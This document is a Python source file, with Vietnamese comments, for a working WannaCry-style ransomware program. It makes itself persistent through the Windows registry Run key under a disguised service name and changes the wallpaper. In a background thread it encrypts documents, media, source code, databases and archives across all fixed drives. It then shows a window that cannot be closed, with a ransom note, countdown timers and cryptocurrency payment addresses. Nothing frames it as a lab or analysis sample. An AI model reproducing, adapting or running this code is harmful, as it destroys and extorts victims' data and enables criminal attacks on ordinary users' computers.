import os
import ctypes
import sys
import tkinter as tk
from tkinter import scrolledtext, messagebox
from PIL import Image, ImageTk
import psutil
import base64
import time
from threading import Thread
import winreg

# --- CẤU HÌNH ---
UNLOCK_KEY = "PENTA123"
FILE_ANH = "a.png" 

# Tự động cài đặt thư viện nếu thiếu
try:
    from cryptography.fernet import Fernet
except ImportError:
    os.system(f'"{sys.executable}" -m pip install cryptography')
    from cryptography.fernet import Fernet

# --- HÀM HỖ TRỢ HỆ THỐNG ---

def resource_path(relative_path):
    try:
        base_path = sys._MEIPASS # pyright: ignore[reportAttributeAccessIssue]
    except Exception:
        base_path = os.path.abspath(".")
    return os.path.join(base_path, relative_path)

def get_fernet_key(key_str):
    # Tạo key 32 bytes chuẩn cho Fernet
    return base64.urlsafe_b64encode(key_str.ljust(32)[:32].encode())

def add_to_startup():
    try:
        exe_path = os.path.realpath(sys.argv[0])
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "SystemRuntimeService", 0, winreg.REG_SZ, f'"{exe_path}"')
        winreg.CloseKey(key)
    except: pass

def remove_from_startup():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
        winreg.DeleteValue(key, "SystemRuntimeService")
        winreg.CloseKey(key)
    except: pass

def thiet_lap_hinh_nen_fit(path_anh):
    if not os.path.exists(path_anh): return
    try:
        # Chỉnh Registry để Stretch ảnh
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Control Panel\Desktop", 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(key, "WallpaperStyle", 0, winreg.REG_SZ, "2")
        winreg.SetValueEx(key, "TileWallpaper", 0, winreg.REG_SZ, "0")
        winreg.CloseKey(key)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path_anh, 3)
    except: pass

def khoi_phuc_background_mac_dinh():
    try:
        # File gốc của Win 10/11
        default_wall = r"C:\Windows\Web\Wallpaper\Windows\img0.jpg"
        if os.path.exists(default_wall):
            ctypes.windll.user32.SystemParametersInfoW(20, 0, default_wall, 3)
    except: pass

# --- LOGIC MÃ HÓA / GIẢI MÃ ---

def thuc_thi_ma_hoa(key):
    try:
        f_cipher = Fernet(get_fernet_key(key))
        
        # 1. Định nghĩa danh sách đuôi file bên TRONG hàm
        extensions = [
            '.doc', '.docx', '.xls', '.xlsx', '.ppt', '.pptx', '.pdf', '.txt', '.rtf', '.csv',
            '.jpg', '.jpeg', '.png', '.gif', '.psd', '.ai', '.svg', '.ico',
            '.mp4', '.mkv', '.avi', '.mov', '.mp3', '.wav', '.flac', '.aac', '.m4a' ,  '.go', '.py', '.java', '.c', '.cpp', '.cs', '.php', '.html', '.css', '.js', '.json', '.sql', '.db', '.sqlite', '.zip', '.rar', '.7z', '.bak',
            '.py', '.java', '.c', '.cpp', '.cs', '.php', '.html', '.css', '.js', '.json',
            '.sql', '.db', '.sqlite', '.zip', '.rar', '.7z', '.bak'
        ]

        # 2. Danh sách thư mục nhạy cảm
        thu_muc_cam = [
            'windows', '$recycle.bin', 'boot', 'system volume information', 'programdata'
        ]

        # 3. Lấy danh sách ổ đĩa
        o_dias = [p.mountpoint for p in psutil.disk_partitions() if 'fixed' in p.opts]

        for o_dia in o_dias:
            for root, dirs, files in os.walk(o_dia):
                root_lower = root.lower()
                
                # Bỏ qua thư mục hệ thống
                if any(x in root_lower for x in thu_muc_cam):
                    continue 

                for file in files:
                    file_lower = file.lower()
                    
                    # KIỂM TRA ĐUÔI FILE (Sửa lỗi logic tại đây)
                    if any(file_lower.endswith(ext) for ext in extensions):
                        file_path = os.path.join(root, file)
                        
                        # Né file thực thi và dịch vụ hệ thống
                        if "SystemRuntimeService" in file or file.endswith(".exe"):
                            continue
                            
                        try:
                            # Tối ưu: Bỏ qua file quá lớn (>100MB) để chạy nhanh hơn
                            if os.path.getsize(file_path) > 100 * 1024 * 1024:
                                continue

                            with open(file_path, "rb") as f:
                                data = f.read()

                            if not data.startswith(b"ENC_"):
                                with open(file_path, "wb") as f_enc:
                                    f_enc.write(b"ENC_" + f_cipher.encrypt(data))
                        except:
                            pass
    except Exception as e:
        print(f"Lỗi mã hóa: {e}")

def thuc_thi_giai_ma(key):
    try:
        f_cipher = Fernet(get_fernet_key(key))
        o_dias = [p.mountpoint for p in psutil.disk_partitions() if 'fixed' in p.opts]
        for o_dia in o_dias:
            for root, dirs, files in os.walk(o_dia):
                for file in files:
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, "rb") as f: 
                            data = f.read()
                        if data.startswith(b"ENC_"):
                            # Giải mã bỏ qua 4 byte đầu (ENC_)
                            decrypted_data = f_cipher.decrypt(data[4:])
                            with open(file_path, "wb") as f_dec: 
                                f_dec.write(decrypted_data)
                    except: 
                        continue
    except Exception as e:
        print(f"Lỗi giải mã: {e}")
# --- GIAO DIỆN ---

class WannaCryInterface:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Wana Decrypt0r 2.0")
        self.root.geometry("800x600")
        self.root.resizable(False, False)
        self.root.attributes("-topmost", True)
        self.root.configure(bg="#841414")
        self.root.protocol("WM_DELETE_WINDOW", lambda: None) # Chặn nút X

        tk.Label(self.root, text="Ooops, your files have been encrypted!", 
                 fg="white", bg="#841414", font=("Segoe UI", 20, "bold")).pack(pady=10)

        main_frame = tk.Frame(self.root, bg="#841414")
        main_frame.pack(fill="both", expand=True, padx=15)

        left_pnl = tk.Frame(main_frame, bg="#841414", width=220)
        left_pnl.pack(side="left", fill="y", padx=5)

        path = resource_path(FILE_ANH)
        if os.path.exists(path):
            img = Image.open(path).resize((180, 180), Image.Resampling.LANCZOS)
            self.photo = ImageTk.PhotoImage(img)
            tk.Label(left_pnl, image=self.photo, bg="#841414").pack(pady=10)

        self.timer1 = self.create_timer_box(left_pnl, "Payment will be raised on")
        self.timer2 = self.create_timer_box(left_pnl, "Your files will be lost on")

        right_pnl = tk.Frame(main_frame, bg="white")
        right_pnl.pack(side="right", fill="both", expand=True, padx=5)
        txt = scrolledtext.ScrolledText(right_pnl, wrap=tk.WORD, font=("Segoe UI", 10))
        txt.insert(tk.INSERT, "All your files are encrypted. Enter the key to decrypt.\n\nIf you don't pay within 48 hours, your files will be lost forever.\n\nTo get the key, contact us at:\nEmail: support@wannacry.com\nTelegram: @wannacry_support\n\nPayment Methods:\n- Bitcoin: 1A2b3C4d5E6f7G8h9I0jK1L2M3N4O5P6Q\n- Ethereum: 0xAbC1234567890Def1234567890aBCdEf12345678")
        txt.config(state="disabled")
        txt.pack(fill="both", expand=True)

        footer = tk.Frame(self.root, bg="#841414")
        footer.pack(fill="x", pady=10)
        self.key_entry = tk.Entry(footer, width=35, font=("Arial", 12))
        self.key_entry.pack(side="left", padx=40)
        
        tk.Button(footer, text="Decrypt", command=self.handle_decrypt, width=15).pack(side="left")

        self.update_clock()
        self.root.mainloop()

    def create_timer_box(self, parent, title):
        box = tk.LabelFrame(parent, text=title, fg="yellow", bg="#841414")
        box.pack(fill="x", pady=5)
        lbl = tk.Label(box, text="00:00:00", fg="white", bg="#841414", font=("Courier", 14, "bold"))
        lbl.pack()
        return lbl

    def update_clock(self):
        t = time.strftime('%H:%M:%S')
        self.timer1.config(text=f"02:{t}"); self.timer2.config(text=f"06:{t}")
        self.root.after(1000, self.update_clock)

    def handle_decrypt(self):
        input_key = self.key_entry.get()
        if input_key == UNLOCK_KEY:
            self.key_entry.delete(0, tk.END)
            self.key_entry.insert(0, "DECRYPTING... PLEASE WAIT 1-2 HOURS")
            self.key_entry.config(state="disabled")
            self.root.update()
            
            # Chạy giải mã trong Thread để không treo giao diện
            t = Thread(target=self.run_decryption_task)
            t.daemon = True
            t.start()
        else:
            self.key_entry.delete(0, tk.END)
            self.key_entry.insert(0, "WRONG KEY!")

    def run_decryption_task(self):
        try:
            thuc_thi_giai_ma(UNLOCK_KEY)
            self.root.after(0, self.hien_thi_thanh_cong)
        except Exception as e:
            self.root.after(0, lambda: messagebox.showerror("Error", f"Lỗi: {e}"))

    def hien_thi_thanh_cong(self):
        messagebox.showinfo("Success", "DECRYPT SUCCESS! Restoring defaults...")
        khoi_phuc_background_mac_dinh()
        remove_from_startup()
        self.root.destroy()
        sys.exit()

# --- KHỞI CHẠY ---
if __name__ == "__main__":
    # 1. Setup ban đầu
    anh_nen = resource_path(FILE_ANH)
    thiet_lap_hinh_nen_fit(anh_nen)
    add_to_startup()
    
    # 2. Chạy mã hóa ngầm
    Thread(target=thuc_thi_ma_hoa, args=(UNLOCK_KEY,), daemon=True).start()
    
    # 3. Mở UI
    WannaCryInterface()